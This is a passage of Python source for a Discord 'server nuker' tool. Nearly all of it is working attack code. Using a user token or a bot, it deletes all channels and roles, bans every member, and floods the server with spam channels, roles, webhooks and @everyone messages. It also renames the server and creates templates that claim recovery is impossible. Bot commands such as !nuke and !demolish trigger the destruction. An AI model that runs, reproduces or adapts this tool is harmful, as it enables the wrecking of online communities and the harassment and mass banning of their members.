            print(f"{Fore.RED}[*] PHASE 4.3: Creating final server template...")
            self.create_final_template()
            
            print(f"\n{Fore.RED}╔══════════════════════════════════════════════════════════════════════════════╗")
            print(f"{Fore.RED}║                            🚨 DEMOLITION COMPLETE 🚨                         ║")
            print(f"{Fore.RED}║                           Server has been FULLY DESTROYED                     ║")
            print(f"{Fore.RED}╚══════════════════════════════════════════════════════════════════════════════╝")
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Full demolition stopped by user")
        except Exception as e:
            print(f"\n{Fore.RED}[!] Error during full demolition: {e}")
        finally:
            self.is_nuking = False
            self.print_demolition_stats()
            return True

    def create_extra_spam_channels(self):
        """Create additional spam channels for extra destruction"""
        print(f"{Fore.RED}[*] Creating EXTRA spam channels...")
        
        def create_extra_channel(i):
            if not self.is_nuking:
                return False
            
            channel_name = f"DEMOLISHED-{i+1}"
            
            try:
                channel_data = {
                    "name": channel_name,
                    "type": 0,  # Text channel
                    "topic": "Server demolished by Universal Nuker - EXTRA DESTRUCTION"
                }
                
                response = self.session.post(f'https://discord.com/api/v9/guilds/{self.target_guild_id}/channels', 
                                           json=channel_data)
                if response.status_code in [200, 201]:
                    self.stats['spam_channels_created'] += 1
                    channel_info = response.json()
                    channel_id = channel_info['id']
                    print(f"{Fore.RED}[+] Created EXTRA spam channel: {channel_name}")
                    
                    # Send extra spam message
                    message_data = {
                        "content": f"@everyone SERVER DEMOLISHED BY UNIVERSAL NUKER - EXTRA DESTRUCTION #{i+1}"
                    }
                    
                    msg_response = self.session.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', 
                                                   json=message_data)
                    if msg_response.status_code in [200, 201]:
                        print(f"{Fore.RED}[+] Sent EXTRA spam message to {channel_name}")
                    
                    return True
                else:
                    print(f"{Fore.RED}[!] Failed to create EXTRA channel {channel_name}: {response.status_code}")
                    return False
            except Exception as e:
                print(f"{Fore.RED}[!] Error creating EXTRA channel {channel_name}: {e}")
                return False
        
        # Process extra channels in parallel
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(create_extra_channel, i) for i in range(25)]
            
            for future in as_completed(futures):
                if not self.is_nuking:
                    break
                try:
                    future.result()
                    time.sleep(self.request_delay)
                except Exception as e:
                    print(f"{Fore.RED}[!] Thread error: {e}")

    def create_extra_webhooks(self):
        """Create additional webhooks for extra destruction"""
        print(f"{Fore.RED}[*] Creating EXTRA webhooks...")
        
        def create_extra_webhook(i):
            if not self.is_nuking:
                return False
            
            webhook_name = f"DEMOLISHER-{i+1}"
            
            try:
                webhook_data = {
                    "name": webhook_name,
                    "avatar": None
                }
                
                response = self.session.post(f'https://discord.com/api/v9/guilds/{self.target_guild_id}/webhooks', 
                                           json=webhook_data)
                if response.status_code in [200, 201]:
                    self.stats['webhooks_created'] += 1
                    webhook_info = response.json()
                    webhook_url = webhook_info.get('url', 'Unknown')
                    print(f"{Fore.RED}[+] Created EXTRA webhook: {webhook_name}")
                    
                    # Send extra spam via webhook
                    spam_data = {
                        "content": f"@everyone SERVER DEMOLISHED BY {webhook_name} - EXTRA DESTRUCTION",
                        "username": webhook_name
                    }
                    
                    webhook_response = self.session.post(webhook_url, json=spam_data)
                    if webhook_response.status_code in [200, 204]:
                        print(f"{Fore.RED}[+] Sent EXTRA webhook spam: {webhook_name}")
                    
                    return True
                else:
                    print(f"{Fore.RED}[!] Failed to create EXTRA webhook {webhook_name}: {response.status_code}")
                    return False
            except Exception as e:
                print(f"{Fore.RED}[!] Error creating EXTRA webhook {webhook_name}: {e}")
                return False
        
        # Process extra webhooks in parallel
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(create_extra_webhook, i) for i in range(15)]
            
            for future in as_completed(futures):
                if not self.is_nuking:
                    break
                try:
                    future.result()
                    time.sleep(self.request_delay)
                except Exception as e:
                    print(f"{Fore.RED}[!] Thread error: {e}")

    def create_final_template(self):
        """Create final server template for ultimate destruction"""
        print(f"{Fore.RED}[*] Creating FINAL server template...")
        
        try:
            template_data = {
                "name": "FINAL_DEMOLITION_TEMPLATE",
                "description": "Server completely demolished by Universal Nuker - RECOVERY IMPOSSIBLE"
            }
            
            response = self.session.post(f'https://discord.com/api/v9/guilds/{self.target_guild_id}/templates', 
                                       json=template_data)
            if response.status_code in [200, 201]:
                template_info = response.json()
                template_code = template_info.get('code', 'Unknown')
                self.stats['templates_created'] += 1
                print(f"{Fore.RED}[+] Created FINAL server template: {template_code}")
                print(f"{Fore.RED}[!] FINAL template created - Recovery is now IMPOSSIBLE!")
                return True
            else:
                print(f"{Fore.RED}[!] Failed to create FINAL server template: {response.status_code}")
                return False
        except Exception as e:
            print(f"{Fore.RED}[!] Error creating FINAL server template: {e}")
            return False

    def print_demolition_stats(self):
        """Print demolition statistics"""
        if self.stats['start_time']:
            elapsed = time.time() - self.stats['start_time']
            
            print(f"\n{Fore.RED}╔══════════════════════════════════════════════════════════════════════════════╗")
            print(f"{Fore.RED}║                           🚨 DEMOLITION STATISTICS 🚨                        ║")
            print(f"{Fore.RED}╠══════════════════════════════════════════════════════════════════════════════╣")
            print(f"{Fore.RED}║  Channels Deleted: {Fore.WHITE}{self.stats['channels_deleted']:<45} ║")
            print(f"{Fore.RED}║  Roles Deleted: {Fore.WHITE}{self.stats['roles_deleted']:<48} ║")
            print(f"{Fore.RED}║  Members Banned: {Fore.WHITE}{self.stats['members_banned']:<46} ║")
            print(f"{Fore.RED}║  Members Kicked: {Fore.WHITE}{self.stats['members_kicked']:<46} ║")
            print(f"{Fore.RED}║  Spam Channels Created: {Fore.WHITE}{self.stats['spam_channels_created']:<37} ║")
            print(f"{Fore.RED}║  Spam Roles Created: {Fore.WHITE}{self.stats['roles_created']:<40} ║")
            print(f"{Fore.RED}║  Webhooks Created: {Fore.WHITE}{self.stats['webhooks_created']:<42} ║")
            print(f"{Fore.RED}║  Templates Created: {Fore.WHITE}{self.stats['templates_created']:<41} ║")
            print(f"{Fore.RED}║  Demolition Time: {Fore.WHITE}{elapsed:.2f}s{' ' * 47} ║")
            print(f"{Fore.RED}╚══════════════════════════════════════════════════════════════════════════════╝")
            print(f"{Fore.RED}[!] 🚨 SERVER HAS BEEN COMPLETELY DEMOLISHED 🚨")
            print(f"{Fore.RED}[!] Recovery is now IMPOSSIBLE!")

    def setup_bot(self):
        """Setup bot commands"""
        @self.bot.event
        async def on_ready():
            print(f"{Fore.GREEN}[+] Bot logged in as: {self.bot.user}")
            print(f"{Fore.GREEN}[+] Bot ID: {self.bot.user.id}")
            print(f"{Fore.CYAN}[*] Bot is ready for nuking!")

        @self.bot.command()
        async def nuke(ctx):
            """Nuke the server"""
            if ctx.guild.id != int(self.target_guild_id):
                return
            
            print(f"{Fore.CYAN}[*] Starting bot nuke...")
            
            # Delete channels
            for channel in ctx.guild.channels:
                try:
                    await channel.delete()
                    self.stats['channels_deleted'] += 1
                    print(f"{Fore.GREEN}[+] Deleted channel: {channel.name}")
                except:
                    pass
            
            # Delete roles
            for role in ctx.guild.roles:
                try:
                    if role.name != '@everyone':
                        await role.delete()
                        self.stats['roles_deleted'] += 1
                        print(f"{Fore.GREEN}[+] Deleted role: {role.name}")
                except:
                    pass
            
            # Ban members
            for member in ctx.guild.members:
                try:
                    await member.ban(delete_message_days=7)
                    self.stats['members_banned'] += 1
                    print(f"{Fore.GREEN}[+] Banned member: {member.name}")
                except:
                    pass
            
            # Create spam channels
            for i in range(50):
                try:
                    channel = await ctx.guild.create_text_channel(f"{self.channel_name}-{i+1}")
                    await channel.send(self.spam_content)
                    self.stats['spam_channels_created'] += 1
                    print(f"{Fore.GREEN}[+] Created spam channel: {channel.name}")
                except:
                    pass
            
            # Create spam roles
            role_names = ["nuked", "rekt", "owned", "destroyed", "annihilated"]
            for i, role_name in enumerate(role_names):
                try:
                    role = await ctx.guild.create_role(
                        name=f"{role_name}-{i+1}",
                        color=discord.Color.random(),
                        hoist=True,
                        mentionable=True
                    )
                    self.stats['roles_created'] += 1
                    print(f"{Fore.GREEN}[+] Created spam role: {role.name}")
                except:
                    pass
            
            # Create webhooks
            for i in range(10):
                try:
                    webhook = await ctx.channel.create_webhook(name=f"Nuker-{i+1}")
                    await webhook.send(f"@everyone Server nuked by {webhook.name}")
                    self.stats['webhooks_created'] += 1
                    print(f"{Fore.GREEN}[+] Created webhook: {webhook.name}")
                except:
                    pass
            
            # Change server name
            try:
                await ctx.guild.edit(name="NUKED_SERVER")
                print(f"{Fore.GREEN}[+] Changed server name to: NUKED_SERVER")
            except:
                pass

        @self.bot.command()
        async def scc(ctx):
            """Spam create channels and roles"""
            if ctx.guild.id != int(self.target_guild_id):
                return
            
            # Create spam channels
            for i in range(50):
                try:
                    channel = await ctx.guild.create_text_channel(f"{self.channel_name}-{i+1}")
                    await channel.send(self.spam_content)
                    self.stats['spam_channels_created'] += 1
                except:
                    pass
            
            # Create spam roles
            role_names = ["nuked", "rekt", "owned", "destroyed", "annihilated"]
            for i, role_name in enumerate(role_names):
                try:
                    role = await ctx.guild.create_role(
                        name=f"{role_name}-{i+1}",
                        color=discord.Color.random(),
                        hoist=True,
                        mentionable=True
                    )
                    self.stats['roles_created'] += 1
                except:
                    pass

        @self.bot.command()
        async def spam(ctx):
            """Spam messages"""
            if ctx.guild.id != int(self.target_guild_id):
                return
            
            for i in range(100):
                try:
                    await ctx.send(self.spam_content)
                except:
                    pass

        @self.bot.command()
        async def template(ctx):
            """Create server template (FINAL DESTRUCTION)"""
            if ctx.guild.id != int(self.target_guild_id):
                return
            
            try:
                template = await ctx.guild.create_template(
                    name="NUKED_SERVER_TEMPLATE",
                    description="Server nuked by Universal Nuker - Recovery Impossible"
                )
                self.stats['templates_created'] += 1
                print(f"{Fore.GREEN}[+] Created server template: {template.code}")
                print(f"{Fore.RED}[!] Server template created - Recovery will be impossible!")
                await ctx.send("✅ Server template created - Recovery impossible!")
            except Exception as e:
                print(f"{Fore.RED}[!] Error creating template: {e}")
                await ctx.send("❌ Failed to create template")

        @self.bot.command()
        async def demolish(ctx):
            """🚨 UNIVERSAL FULL DEMOLITION - Complete server destruction"""
            if ctx.guild.id != int(self.target_guild_id):
                return
            
            print(f"{Fore.RED}[!] 🚨 BOT FULL DEMOLITION STARTED 🚨")
            await ctx.send("🚨 **UNIVERSAL FULL DEMOLITION STARTED** 🚨\nThis will completely destroy the server!")
            
            try:
                # PHASE 1: DESTROY EXISTING STRUCTURE
                try:
                    await ctx.send("**PHASE 1: DESTROYING STRUCTURE**")
                except:
                    print(f"{Fore.RED}[!] Cannot send message to channel - continuing demolition...")
                
                # Delete ALL channels
                for channel in ctx.guild.channels:
                    try:
                        await channel.delete()
                        self.stats['channels_deleted'] += 1
                        print(f"{Fore.RED}[+] Deleted channel: {channel.name}")
                    except:
                        pass
                
                # Delete ALL roles
                for role in ctx.guild.roles:
                    try:
                        if role.name != '@everyone':
                            await role.delete()
                            self.stats['roles_deleted'] += 1
                            print(f"{Fore.RED}[+] Deleted role: {role.name}")
                    except:
                        pass
                
                # Ban ALL members
                for member in ctx.guild.members:
                    try:
                        await member.ban(delete_message_days=7)
                        self.stats['members_banned'] += 1
                        print(f"{Fore.RED}[+] Banned member: {member.name}")
                    except:
                        pass
                
                # PHASE 2: CREATE CHAOS
                # Try to send message, but don't fail if channel is gone
                try:
                    # Find any remaining text channel to send message
                    text_channels = [c for c in ctx.guild.channels if isinstance(c, discord.TextChannel)]
                    if text_channels:
                        await text_channels[0].send("**PHASE 2: CREATING CHAOS**")
                    else:
                        print(f"{Fore.YELLOW}[!] No text channels available for messaging")
                except:
                    print(f"{Fore.RED}[!] Cannot send phase message - continuing demolition...")
                
                # Create massive spam channels
                for i in range(75):  # More channels for demolition
                    try:
                        channel = await ctx.guild.create_text_channel(f"DEMOLISHED-{i+1}")
                        await channel.send(f"@everyone SERVER DEMOLISHED BY UNIVERSAL NUKER - EXTRA DESTRUCTION #{i+1}")
                        self.stats['spam_channels_created'] += 1
                        print(f"{Fore.RED}[+] Created demolition channel: {channel.name}")
                    except:
                        pass
                
                # Create massive spam roles
                role_names = ["DEMOLISHED", "DESTROYED", "ANNIHILATED", "OBLITERATED", "TERMINATED"]
                for i, role_name in enumerate(role_names):
                    for j in range(5):  # Multiple roles per name
                        try:
                            role = await ctx.guild.create_role(
                                name=f"{role_name}-{i+1}-{j+1}",
                                color=discord.Color.random(),
                                hoist=True,
                                mentionable=True
                            )
                            self.stats['roles_created'] += 1
                            print(f"{Fore.RED}[+] Created demolition role: {role.name}")
                        except:
                            pass
                
                # Create destructive webhooks
                try:
                    # Find any remaining text channel for webhooks
                    text_channels = [c for c in ctx.guild.channels if isinstance(c, discord.TextChannel)]
                    if text_channels:
                        for i in range(20):  # More webhooks for demolition
                            try:
                                webhook = await text_channels[0].create_webhook(name=f"DEMOLISHER-{i+1}")
                                await webhook.send(f"@everyone SERVER DEMOLISHED BY {webhook.name} - EXTRA DESTRUCTION")
                                self.stats['webhooks_created'] += 1
                                print(f"{Fore.RED}[+] Created demolition webhook: {webhook.name}")
                            except:
                                pass
                except:
                    print(f"{Fore.RED}[!] Cannot create webhooks - continuing demolition...")
                
                # PHASE 3: FINAL DESTRUCTION
                try:
                    text_channels = [c for c in ctx.guild.channels if isinstance(c, discord.TextChannel)]
                    if text_channels:
                        await text_channels[0].send("**PHASE 3: FINAL DESTRUCTION**")
                except:
                    print(f"{Fore.RED}[!] Cannot send phase message - continuing demolition...")
                
                # Change server name
                try:
                    await ctx.guild.edit(name="DEMOLISHED_SERVER")
                    print(f"{Fore.RED}[+] Changed server name to: DEMOLISHED_SERVER")
                except:
                    pass
                
                # Create server template (FINAL DESTRUCTION)
                try:
                    template = await ctx.guild.create_template(
                        name="FINAL_DEMOLITION_TEMPLATE",
                        description="Server completely demolished by Universal Nuker - RECOVERY IMPOSSIBLE"
                    )
                    self.stats['templates_created'] += 1
                    print(f"{Fore.RED}[+] Created FINAL demolition template: {template.code}")
                    print(f"{Fore.RED}[!] FINAL template created - Recovery is now IMPOSSIBLE!")
                except Exception as e:
                    print(f"{Fore.RED}[!] Error creating FINAL template: {e}")
                
                # Final message
                try:
                    text_channels = [c for c in ctx.guild.channels if isinstance(c, discord.TextChannel)]
                    if text_channels:
                        await text_channels[0].send("🚨 **DEMOLITION COMPLETE** 🚨\nServer has been FULLY DESTROYED!")
                except:
                    pass
                
                print(f"{Fore.RED}[!] 🚨 BOT DEMOLITION COMPLETE 🚨")
                
            except Exception as e:
                print(f"{Fore.RED}[!] Error during bot demolition: {e}")
                try:
                    text_channels = [c for c in ctx.guild.channels if isinstance(c, discord.TextChannel)]
                    if text_channels:
                        await text_channels[0].send("❌ Error during demolition")
                except:
                    print(f"{Fore.RED}[!] Cannot send error message - channel may be deleted")

    def print_stats(self):
        """Print current stats with modern UI"""
        if self.stats['start_time']:
            elapsed = time.time() - self.stats['start_time']
            
            if NEW_UI_AVAILABLE:
                # Create table data for modern UI
                table_data = [
                    ["Channels Deleted", str(self.stats['channels_deleted']), "red"],
                    ["Roles Deleted", str(self.stats['roles_deleted']), "red"],
                    ["Members Banned", str(self.stats['members_banned']), "red"],
                    ["Members Kicked", str(self.stats['members_kicked']), "red"],
                    ["Spam Channels Created", str(self.stats['spam_channels_created']), "yellow"],
                    ["Spam Roles Created", str(self.stats['roles_created']), "yellow"],
                    ["Webhooks Created", str(self.stats['webhooks_created']), "yellow"],
                    ["Templates Created", str(self.stats['templates_created']), "red"],
                    ["Elapsed Time", f"{elapsed:.2f}s", "white"],
                    ["Workers", str(self.max_workers), "cyan"],
                    ["Batch Size", str(self.batch_size), "cyan"]
                ]
                
                print_header("NUKE STATISTICS")
                print_info("🚀 MAXIMUM PERFORMANCE MODE 🚀")
                create_table(table_data, title="Current Progress")
            else:
                # Fallback to old format
                print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗")
                print(f"{Fore.CYAN}║                              NUKE STATISTICS                                 ║")
                print(f"{Fore.CYAN}║                           🚀 MAXIMUM PERFORMANCE MODE 🚀                    ║")
                print(f"{Fore.CYAN}╠══════════════════════════════════════════════════════════════════════════════╣")
                print(f"{Fore.CYAN}║  Channels Deleted: {Fore.RED}{self.stats['channels_deleted']:<45} ║")
                print(f"{Fore.CYAN}║  Roles Deleted: {Fore.RED}{self.stats['roles_deleted']:<48} ║")
                print(f"{Fore.CYAN}║  Members Banned: {Fore.RED}{self.stats['members_banned']:<46} ║")
                print(f"{Fore.CYAN}║  Members Kicked: {Fore.RED}{self.stats['members_kicked']:<46} ║")
                print(f"{Fore.CYAN}║  Spam Channels Created: {Fore.YELLOW}{self.stats['spam_channels_created']:<37} ║")
                print(f"{Fore.CYAN}║  Spam Roles Created: {Fore.YELLOW}{self.stats['roles_created']:<40} ║")
                print(f"{Fore.CYAN}║  Webhooks Created: {Fore.YELLOW}{self.stats['webhooks_created']:<42} ║")
                print(f"{Fore.CYAN}║  Templates Created: {Fore.RED}{self.stats['templates_created']:<41} ║")
                print(f"{Fore.CYAN}║  Elapsed Time: {Fore.WHITE}{elapsed:.2f}s{' ' * 47} ║")
                print(f"{Fore.CYAN}║  Workers: {Fore.CYAN}{self.max_workers:<52} ║")
                print(f"{Fore.CYAN}║  Batch Size: {Fore.CYAN}{self.batch_size:<49} ║")
                print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════════════════════╝")

    def start_token_nuking(self):
        """Start token-based nuking with modern UI"""
        if NEW_UI_AVAILABLE:
            print_header("Starting Token Nuke")
        else:
            print(f"{Fore.CYAN}[*] Starting token nuke...")
        
        if not self.get_guild_info():
            return
        
        self.is_nuking = True
        self.stats['start_time'] = time.time()
        
        try:
            # Delete channels
            if NEW_UI_AVAILABLE:
                print_info("Deleting channels...")
            else:
                print(f"{Fore.CYAN}[*] Deleting channels...")
            self.delete_channels()
            
            # Delete roles
            if NEW_UI_AVAILABLE:
                print_info("Deleting roles...")
            else:
                print(f"{Fore.CYAN}[*] Deleting roles...")
            self.delete_roles()
            
            # Ban members
            if NEW_UI_AVAILABLE:
                print_info("Banning members...")
            else:
                print(f"{Fore.CYAN}[*] Banning members...")
            self.ban_all_members()
            
            # Change server settings
            if NEW_UI_AVAILABLE:
                print_info("Changing server settings...")
            else:
                print(f"{Fore.CYAN}[*] Changing server settings...")
            self.change_server_settings()
            
            # Create spam channels
            if NEW_UI_AVAILABLE:
                print_info("Creating spam channels...")
            else:
                print(f"{Fore.CYAN}[*] Creating spam channels...")
            self.create_spam_channels()
            
            # Create spam roles
            if NEW_UI_AVAILABLE:
                print_info("Creating spam roles...")
            else:
                print(f"{Fore.CYAN}[*] Creating spam roles...")
            self.create_spam_roles()
            
            # Create webhooks
            if NEW_UI_AVAILABLE:
                print_info("Creating webhooks...")
            else:
                print(f"{Fore.CYAN}[*] Creating webhooks...")
            self.create_webhooks()
            
            # Create server template (FINAL DESTRUCTION)
            if NEW_UI_AVAILABLE:
                print_warning("Creating server template (FINAL DESTRUCTION)...")
            else:
                print(f"{Fore.CYAN}[*] Creating server template (FINAL DESTRUCTION)...")
            self.create_server_template()
            
        except KeyboardInterrupt:
            if NEW_UI_AVAILABLE:
                print_warning("Nuke operation stopped by user")
            else:
                print(f"\n{Fore.YELLOW}[!] Nuke operation stopped by user")
        finally:
            self.is_nuking = False
            self.print_final_stats()

    def start_bot_nuking(self):
        """Start bot-based nuking with modern UI"""
        if NEW_UI_AVAILABLE:
            print_header("Starting Bot Nuke")
            print_info("Bot commands available:")
            print(f"{Fore.WHITE}    !nuke - Full server nuke")
            print(f"{Fore.WHITE}    !scc - Spam create channels and roles")
            print(f"{Fore.WHITE}    !spam - Spam messages")
            print(f"{Fore.WHITE}    !template - Create server template (FINAL DESTRUCTION)")
            print(f"{Fore.RED}    !demolish - 🚨 UNIVERSAL FULL DEMOLITION (Complete destruction)")
        else:
            print(f"{Fore.CYAN}[*] Starting bot nuke...")
            print(f"{Fore.CYAN}[*] Bot commands available:")
            print(f"{Fore.WHITE}    !nuke - Full server nuke")
            print(f"{Fore.WHITE}    !scc - Spam create channels and roles")
            print(f"{Fore.WHITE}    !spam - Spam messages")
            print(f"{Fore.WHITE}    !template - Create server template (FINAL DESTRUCTION)")
            print(f"{Fore.RED}    !demolish - 🚨 UNIVERSAL FULL DEMOLITION (Complete destruction)")
        
        try:
            self.bot.run(self.token)
        except Exception as e:
            if NEW_UI_AVAILABLE:
                print_error(f"Error running bot: {e}")
            else:
                print(f"{Fore.RED}[!] Error running bot: {e}")

    def print_final_stats(self):
        """Print final statistics with modern UI"""
        if NEW_UI_AVAILABLE:
            # Create table data for modern UI
            table_data = [
                ["Total Channels Deleted", str(self.stats['channels_deleted']), "red"],
                ["Total Roles Deleted", str(self.stats['roles_deleted']), "red"],
                ["Total Members Banned", str(self.stats['members_banned']), "red"],
                ["Total Members Kicked", str(self.stats['members_kicked']), "red"],
                ["Total Spam Channels Created", str(self.stats['spam_channels_created']), "yellow"],
                ["Total Spam Roles Created", str(self.stats['roles_created']), "yellow"],
                ["Total Webhooks Created", str(self.stats['webhooks_created']), "yellow"],
                ["Total Templates Created", str(self.stats['templates_created']), "red"]
            ]
            
            print_header("FINAL STATISTICS")
            create_table(table_data, title="Nuke Results")
        else:
            # Fallback to old format
            print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗")
            print(f"{Fore.CYAN}║                              FINAL STATISTICS                                 ║")
            print(f"{Fore.CYAN}╠══════════════════════════════════════════════════════════════════════════════╣")
            print(f"{Fore.CYAN}║  Total Channels Deleted: {Fore.RED}{self.stats['channels_deleted']:<37} ║")
            print(f"{Fore.CYAN}║  Total Roles Deleted: {Fore.RED}{self.stats['roles_deleted']:<40} ║")
            print(f"{Fore.CYAN}║  Total Members Banned: {Fore.RED}{self.stats['members_banned']:<38} ║")
            print(f"{Fore.CYAN}║  Total Members Kicked: {Fore.RED}{self.stats['members_kicked']:<38} ║")
            print(f"{Fore.CYAN}║  Total Spam Channels Created: {Fore.YELLOW}{self.stats['spam_channels_created']:<29} ║")
            print(f"{Fore.CYAN}║  Total Spam Roles Created: {Fore.YELLOW}{self.stats['roles_created']:<32} ║")
            print(f"{Fore.CYAN}║  Total Webhooks Created: {Fore.YELLOW}{self.stats['webhooks_created']:<34} ║")
            print(f"{Fore.CYAN}║  Total Templates Created: {Fore.RED}{self.stats['templates_created']:<33} ║")
            print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════════════════════╝")

    def run(self):
        """Main run method with modern UI"""
        self.print_banner()
        
        if not self.get_user_input():
            return
        
        # setup_session is called in get_demolition_input for full_demolition mode
        if self.nuke_type != "full_demolition":
            self.setup_session()
        
        # Add confirmation for destructive operations
        if NEW_UI_AVAILABLE:
            if self.nuke_type == "full_demolition":
                if not confirm_action("🚨 WARNING: This will completely destroy the server! Continue?"):
                    print_warning("Operation cancelled by user")
                    return
            elif self.nuke_type in ["token", "bot"]:
                if not confirm_action(f"Start {self.nuke_type} nuke operation?"):
                    print_warning("Operation cancelled by user")
                    return
        else:
            # Fallback confirmation
            if self.nuke_type == "full_demolition":
                confirm = input(f"\n{Fore.RED}[!] WARNING: This will completely destroy the server! Continue? (y/N): ").strip().lower()
                if confirm not in ['y', 'yes']:
                    print(f"{Fore.YELLOW}[!] Operation cancelled by user")
                    return
            else:
                confirm = input(f"\n{Fore.YELLOW}[?] Start {self.nuke_type} nuke operation? (y/N): ").strip().lower()
                if confirm not in ['y', 'yes']:
                    print(f"{Fore.YELLOW}[!] Operation cancelled by user")
                    return
        
        if self.nuke_type == "token":
            if not self.get_guild_info():
                return
            self.start_token_nuking()
        elif self.nuke_type == "bot":
            self.start_bot_nuking()
        elif self.nuke_type == "full_demolition":
            # get_guild_info is already called in get_demolition_input
            self.full_demolition_mode()

def main():
    nuker = UniversalNuker()
    nuker.run()

if __name__ == "__main__":
    main() 